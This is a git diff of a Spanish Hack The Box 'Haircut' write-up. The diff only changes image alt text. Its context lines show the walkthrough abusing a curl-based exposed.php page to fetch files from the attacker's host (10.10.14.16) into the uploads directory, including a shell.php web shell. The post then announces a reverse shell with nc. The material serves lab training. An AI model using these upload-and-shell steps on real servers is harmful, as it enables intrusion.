@@ -98,7 +98,7 @@ http://10.10.10.24/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Lin
 
 Vamos a echarle un ojo al sitio web:
 
-![](/assets/images/htb-haircut/haircut-web.png)
+![""](/assets/images/htb-haircut/haircut-web.png)
 
 No vemos nada internesante, así que vamos a tratar de descubrir rutas dentro del servidor web:
 
@@ -169,11 +169,11 @@ Vemos los siguientes recursos:
 
 Le echamos un ojo primero al recurso `exposed.php`:
 
-![](/assets/images/htb-haircut/haircut-exposed.png)
+![""](/assets/images/htb-haircut/haircut-exposed.png)
 
 Si le damos al botón **Go**, nos arroja lo siguiente:
 
-![](/assets/images/htb-haircut/haircut-exposed1.png)
+![""](/assets/images/htb-haircut/haircut-exposed1.png)
 
 Observamos los siguientes datos que nos pueden parecer un poco
 
@@ -193,7 +193,7 @@ Al probarlos, el sitio nos arroja a siguiente leyenda: ***is not a good thing to
 http://localhost/test.html -o /var/www/html/uploads/test.html
 ```
 
-![](/assets/images/htb-haircut/haircut-curl.png)
+![""](/assets/images/htb-haircut/haircut-curl.png)
 
 Se nos creó el archivo `test.html` en el recurso `uploads`; así que tenemos creación de archivo dentro de dicho directorio. Vamos a probar si tenemos posibilidad de visualizar recursos externos, así que nos creamos un archivo de prueba `test.txt`:
 
@@ -213,7 +213,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 http://10.10.14.16/test.txt
 ```
 
-![](/assets/images/htb-haircut/haircut-curl1.png)
+![""](/assets/images/htb-haircut/haircut-curl1.png)
 
 Nos arroja la información de nuestro archivo, por lo que vamos a probar si podemos guardar dicho archivo en el recurso `uploads`:
 
@@ -221,7 +221,7 @@ Nos arroja la información de nuestro archivo, por lo que vamos a probar si pode
 http://10.10.14.16/test.txt -o /var/www/html/uploads/test.txt
 ```
 
-![](/assets/images/htb-haircut/haircut-curl2.png)
+![""](/assets/images/htb-haircut/haircut-curl2.png)
 
 Podemos subir archivos al sistema, así que vamos a crear nuestro archivo `shell.php`
 
@@ -243,7 +243,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 http://10.10.14.16/shell.php -o /var/www/html/uploads/shell.php
 ```
 
-![](/assets/images/htb-haircut/haircut-shell.png)
+![""](/assets/images/htb-haircut/haircut-shell.png)
 
 Ya tenemos ejecución de comandos a nivel de sistema; asi que vamos a tratar de entablarnos una reverse shell con `nc` y nos ponemos en escucha por el puerto 443:
 
